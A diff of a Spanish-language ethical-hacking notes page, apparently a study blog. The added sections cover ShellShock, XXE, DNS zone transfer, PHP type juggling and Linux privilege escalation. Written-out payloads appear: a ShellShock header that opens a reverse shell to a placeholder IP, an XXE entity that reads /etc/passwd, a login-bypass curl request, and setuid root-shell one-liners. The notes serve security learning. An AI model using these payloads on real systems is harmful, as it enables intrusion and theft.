@@ -309,7 +309,9 @@
           
           
         </p>
-        <h1 id="conceptos-básicos">Conceptos básicos</h1>
+        <p><img src="/assets/images/certifados/Introduccion-al-hacking.jpeg" alt="" /></p>
+
+<h1 id="conceptos-básicos">Conceptos básicos</h1>
 <h2 id="asignación-e-interpretación-de-permisos">Asignación e Interpretación de permisos</h2>
 
 <p>Para interpretar permisos podemos verlos con el comando <strong>ls -l</strong> el cual nos muestra los permisos que tienen las carpetas o 
@@ -617,9 +619,8 @@ Entonces, hay una variedad de trucos diferentes para convertir su LFI en RCE, co
 
 <h2 id="remote-file-inclusion-rfi">Remote File Inclusion RFI</h2>
 
-<p>Esta vulnerabilidad consiste en subir archivos a una página desde la de nuestro servidor compartido por el puerto 80.</p>
-
-<p>Abrimos nuestro servidor de la siguiente manera:</p>
+<p>Esta vulnerabilidad consiste en subir archivos a una página desde la de nuestro servidor compartido por el puerto 80.
+Abrimos nuestro servidor de la siguiente manera:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    sudo python3 -m http.server 80
 </code></pre></div></div>
@@ -654,9 +655,8 @@ No puede predecir el usuario que va a caer en la trampa.</p>
 </ul>
 
 <p>Pero si el código que insertamos no se queda almacenado en la web, sino que va embebido dentro de un enlace que se hace 
-llegar de algún modo a la víctima para que pinche en él, se dice que este tipo de ataque es reflejado.</p>
-
-<p>Se llama así porque, si finalmente la víctima pincha en el enlace, el navegador le llevará a la página en cuestión, 
+llegar de algún modo a la víctima para que pinche en él, se dice que este tipo de ataque es reflejado. 
+Se llama así porque, si finalmente la víctima pincha en el enlace, el navegador le llevará a la página en cuestión, 
 que normalmente es un sitio legal donde el usuario tiene cuenta abierta, y a continuación ejecutará el código embebido, 
 el cual intentará robarle la «cookie» de la sesión, o los datos que introduzca en el formulario, o incluso podrá desencadenar 
 acciones más sofisticadas en su PC. Pero la característica diferencial con el anterior ataque es que en este caso 
@@ -683,8 +683,7 @@ no obstante, el origen de la URL se puede ocultar mediante ingeniería social y 
 
 <h2 id="vulnerabilidad-server-side-request-forgery-ssrf">Vulnerabilidad Server-Side Request Forgery (SSRF)</h2>
 
-<p>Las vulnerabilidades SSRF (Server Side Request Forgery) y los ataques de XSPA (Cross Site Port Attacks) son dos fallos de seguridad 
-que van casi siempre de la mano. Los bugs de SSRF se producen en aplicaciones web inseguras que permiten a un atacante forzar al 
+<p>Las vulnerabilidades SSRF (Server Side Request Forgery) y los ataques de XSPA (Cross Site Port Attacks) son dos fallos de seguridadque van casi siempre de la mano. Los bugs de SSRF se producen en aplicaciones web inseguras que permiten a un atacante forzar al 
 servidor web a realizar peticiones desde dentro del sistema hacia el exterior. Usando esas conexiones, los ataques de XSPA tratan 
 de conocer, en base a las respuestas obtenidas, la lista de puertos que se encuentran abiertos o por el contrario cerrados en el 
 servidor al que se fuerza la conexión.</p>
@@ -757,10 +756,133 @@ insert into Tabla1<span class="o">(</span><span class="nb">id</span>, username, 
   <li>Padding Oracle Attack - BurpSuite Bit Flipper Attack</li>
 </ul>
 
-<p>Para este tipo de ataques utilizamos el burpsuit, mandamos el código fuente al intruder después cargamos un payload a la cookie y marcamos un ataque de tipo Bit Flipper y lo dejamos correr.</p>
+<p>Para este tipo de ataques utilizamos el burpsuit, mandamos el código fuente al intruder después cargamos un payload a la cookie y marcamos un ataque de tipo Bit Flipper y lo dejamos correr.
+Con esta función automatiza el ataque y te envía la cookie correcta que buscas.</p>
 
-<p>Con esta función automatiza el ataque y te envía la cookie correcta que buscas.</p>
+<h2 id="vulnerabilidad-shellshock">Vulnerabilidad ShellShock</h2>
 
+<p>Este tipo de ataque funciona cuando las cabeceras terminan en .cgi, .pl, .sh e incluso pueden ser otras extensiones, algunos vectores vulnerables son:</p>
+
+<ul>
+  <li>Servidor Web CGI</li>
+  <li>Servidor OpenSSH</li>
+  <li>Clientes DHCP</li>
+  <li>Servidor QMail</li>
+  <li>Shell restringida IBM HMC</li>
+</ul>
+
+<p>Para poder hacer un ataque cambiamos el <em>User Agent</em> con BurpSuite y abrimos un puerto de escucha con nc, recargamos la página y se recarga la petición.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: <span class="o">()</span> <span class="o">{</span> :<span class="p">;</span> <span class="o">}</span><span class="p">;</span> /bin/bash <span class="nt">-i</span> /dev/tcp/<span class="o">{</span>IP<span class="o">}</span>/443 
+</code></pre></div></div>
+
+<p><a href="https://blog.cloudflare.com/inside-shellshock/">ShellShock</a></p>
+
+<h2 id="vulnerabilidad-xml-external-entity-injection-xxe">Vulnerabilidad XML External Entity Injection (XXE)</h2>
+
+<p>XXE se refiere a un ataque de falsificación de solicitud de servidor (SSRF), mediante el cual un atacante es capaz de causar:</p>
+
+<ul>
+  <li>Denegación de servicio (DDoS)</li>
+  <li>Acceso a archivos y servicios locales o remotos</li>
+</ul>
+
+<p>Una vulnerabilidad de XXE consiste en una inyección que se aprovecha de la mala configuración del intérprete XML permitiendo incluir entidades externas, este ataque se realiza contra una aplicación que interpreta lenguaje XML en sus parámetros.
+Para identificar esta vulnerabilidad podemos interceptar la página con BurpSuite, si el Content Types es de tipo text/xml, application/xml estos son indicadores que nos permiten verificar, cómo los parámetros son enviados por el request a un intérprete de XML, adicionalmente también existe puede darse al parsear archivos como JSON a XML e inyectar el payload en el sitio web.
+Para ver si la web tiene este tipo de vulnerabilidad podemos intentar lo que se presenta en la siguiente página:</p>
+
+<p><a href="https://backtrackacademy.com/articulo/explorando-la-vulnerabilidad-xxe-xml-external-entity">XXE</a></p>
+
+<p>Inyectamos el código en la página, ya sea en el url o si es que se puede subiendo un archivo malicioso con el sgte código para listar usuarios</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE foo  <span class="o">[</span>&lt;<span class="o">!</span>ENTITY bar SYSTEM <span class="s2">"file:///etc/passwd"</span><span class="o">&gt;]&gt;</span> &lt;foo&gt;&amp;bar<span class="p">;</span>&lt;/foo&gt;
+</code></pre></div></div>
+
+<p><a href="https://underc0de.org/foro/bugs-y-exploits/entendiendo-y-explotando-xxe-(external-xml-entities)/">Entendiendo y Explotando XXE</a></p>
+
+<h2 id="vulnerabilidad-domain-zone-transfer">Vulnerabilidad Domain Zone Transfer</h2>
+
+<p>Las Transferencias de zona dns, a veces llamadas AXFR por el tipo de solicitud, es un tipo de transacción de DNS. Es uno de varios mecanismos disponibles para administradores para replicar bases de datos DNS a través de un conjunto de servidores DNS. La transferencia puede hacerse de dos formas: completa (AXFR) o incremental (IXFR)</p>
+
+<p><a href="https://www.welivesecurity.com/la-es/2015/06/17/trata-ataque-transferencia-zona-dns/">Domain Zone Transfer</a></p>
+
+<p>Tenemos diferentes programas para realizar el ataque, su sintaxis serían las siguientes:</p>
+
+<ul>
+  <li>dnsenum</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsenum <span class="nt">--enum</span> <span class="o">{</span>IP<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>dig</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig @<span class="o">{</span>IP<span class="o">}</span> <span class="o">{</span>URL<span class="o">}</span> axfr     
+</code></pre></div></div>
+
+<h2 id="vulnerabilidades-de-tipo-insecure-deserialization">Vulnerabilidades de tipo Insecure Deserialization</h2>
+
+<p>Para comprender qué es la deserialización insegura, primero debemos comprender qué son la serialización y la deserialización.</p>
+
+<ul>
+  <li>
+    <p>La serialización se refiere a un proceso de conversión de un objeto a un formato que puede conservarse en el disco (por ejemplo,   guardarse en un archivo o almacén de datos), enviarse a través de secuencias (por ejemplo, stdout) o enviarse a través de una re   d. El formato en el que se serializa un objeto puede ser binario o texto estructurado (por ejemplo, XML, JSON YAML…). JSON y XML   son dos de los formatos de serialización más utilizados dentro de las aplicaciones web.</p>
+  </li>
+  <li>
+    <p>La deserialización, por otro lado, es lo opuesto a la serialización, es decir, transformar datos serializados provenientes de un   archivo, flujo o conector de red en un objeto.</p>
+  </li>
+</ul>
+
+<p><a href="https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/">Más información</a></p>
+
+<h2 id="vulnerabilidad-type-juggling-sobre-panel-login">Vulnerabilidad Type Juggling sobre panel Login</h2>
+
+<p>Este tipo de vulnerabilidad se da en archivos .php que usan tablas comparativas para logearse, se pede romper con este comando:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"usuario=&amp;password[]="</span> <span class="o">{</span>IP/<span class="o">}</span>
+</code></pre></div></div>
+
+<h1 id="escala-de-privilegios">Escala de privilegios</h1>
+
+<h2 id="abuso-del-sudoers-para-escalar-privilegios">Abuso del Sudoers para escalar privilegios</h2>
+
+<p>Para escalar privilegios debemos listar los permisos, investigando en <a href="https://gtfobins.github.io/">GTFobins</a> encontramos la manera de acceder como root</p>
+
+<h2 id="abuso-de-permisos-suid-para-escalar-privilegios">Abuso de permisos SUID para escalar privilegios</h2>
+
+<p>Listamos si tenemos privilegios SUID con el comando <code class="language-plaintext highlighter-rouge">find \perm -4000 2&gt;/dev/null</code> y buscamos en la anterior página si hay una vulnerabilidad. 
+<a href="https://www.luisguillen.com/posts/2017/12/como-funcionan-permisos-suid/">SUID</a></p>
+
+<h2 id="abuso-de-las-capabilities-para-escalar-privilegios">Abuso de las Capabilities para escalar privilegios</h2>
+
+<p><a href="https://www.incibe-cert.es/blog/linux-capabilities">Capabilities</a></p>
+
+<p>En la anterior página tenemos información sobre la escala de privilegio a traves de las Capabilities, algunos comandos son:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap <span class="nt">-r</span> / 2&gt;/dev/null <span class="c">#Reconocimiento de capas</span>
+python3.8 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+php7.3 <span class="nt">-r</span> <span class="s2">"posix_setuid(0); system('/bin/bash');"</span>
+</code></pre></div></div>
+<h2 id="path-hijacking--library-hijacking">PATH Hijacking / Library Hijacking</h2>
+
+<p>Para escalar privilegios debemos buscar algunas librerias de python que tienen esta vulnerabilidad, como se muestra en la siguiente página
+<a href="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8">Python Hijacking</a></p>
+
+<h2 id="abuso-del-kernel-para-escalar-privilegios">Abuso del Kernel para escalar privilegios</h2>
+
+<p>Para esta escala de privilegios debemos saber la version de kernel de la máquina y buscar una vulnerabilidad ya sea en searchexploit entre otros.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">uname</span> <span class="nt">-a</span>
+</code></pre></div></div>
+
+<h1 id="reconocimiento-del-sistema">Reconocimiento del sistema</h1>
+
+<p>Es recomendable hacer un reconocimiento de nuestro sistema, la siguiente herramienta nos ayuda a reconocer el sistema Linux, en cuanto a Windows tenemos winPEAS.</p>
+
+<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">Windows</a></p>
+
+<p><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux</a></p>
 
         
       </section>
